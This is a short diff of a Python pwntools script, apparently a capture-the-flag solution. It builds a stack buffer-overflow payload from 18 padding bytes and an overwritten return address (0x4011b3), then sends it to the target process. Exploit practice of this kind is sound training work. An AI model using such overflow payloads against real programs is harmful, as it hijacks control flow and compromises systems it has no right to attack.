@@ -18,7 +18,7 @@ elif sys.argv[1]=="d":
     ''')
 
 
-payload=b"a"*18+b"\xb3\x11\x40\00\00\00\00\00"#p64(0x4011b4)
+payload=b"a"*18+p64(0x4011b3)
 print(payload)
 io.recvuntil(b":")
 io.sendline(payload)
